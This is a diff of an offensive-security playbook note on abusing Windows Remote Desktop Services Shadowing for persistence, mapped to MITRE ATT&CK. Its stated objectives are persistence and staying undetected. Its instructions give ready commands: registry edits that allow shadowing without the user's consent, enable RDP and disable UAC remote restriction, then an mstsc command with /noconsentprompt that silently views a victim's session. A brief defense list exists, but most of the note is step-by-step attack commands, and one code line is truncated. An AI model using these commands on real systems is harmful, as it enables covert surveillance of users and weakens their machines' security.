@@ -37,11 +37,15 @@ Technical Explanation: Remote Desktop Services Shadowing is a feature in Windows
 
 Business Value: Attackers can use this technique to maintain access to a compromised system, even after the initial compromise has been detected and remediated. This can result in the theft of sensitive data, financial loss, and damage to the organization's reputation.
 
+ 
+
 ## Requirements
 
 1. Administrator-level access to the compromised system
 
 1. Access to the Remote Desktop Shadowing command
+
+ 
 
 ## Defense
 
@@ -51,22 +55,34 @@ Business Value: Attackers can use this technique to maintain access to a comprom
 
 1. Disable Remote Desktop Services Shadowing if not required
 
+ 
+
 ## Objectives
 
 1. Maintain persistence on the compromised system
 
 1. Remain undetected on the compromised system
 
+ 
+
 # Instructions
 
 1. To shadow a user's session remotely, run the following commands:
 
+ 
+
+
+
 **Code**: [[reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Micr]]
+
+
 
 > - The first command adds a registry key that enables the shadowing feature with permission to view the session without user's permission.
 - The second command allows remote connections to the computer.
 - The third command disables UAC remote restriction.
 - Finally, run the 'mstsc' command to shadow the remote session. Replace the {ADDRESS} and {SESSION_ID} parameters with the IP address or hostname of the remote host and the shadowee's session ID respectively. Use the /noconsentprompt parameter to bypass the shadowee's permission and /prompt parameter to specify the user's credentials to connect to the remote host.
+
+
 
 **Command** ([[Configure Terminal Services Shadowing]]):
 
@@ -74,11 +90,19 @@ Business Value: Attackers can use this technique to maintain access to a comprom
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
 ```
 
+
+
+
+
 **Command** ([[Allow Remote Connections]]):
 
 ```bash
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
+
+
+
+
 
 **Command** ([[Disable UAC Remote Restriction]]):
 
@@ -86,11 +110,17 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
 
+
+
+
+
 **Command** ([[Shadow a Remote Session]]):
 
 ```bash
 mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -114,3 +144,5 @@ mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
 - [[Elevated]]
 - [[Remote Desktop Services Shadowing]]
 - [[Windows - Persistence]]
+
+
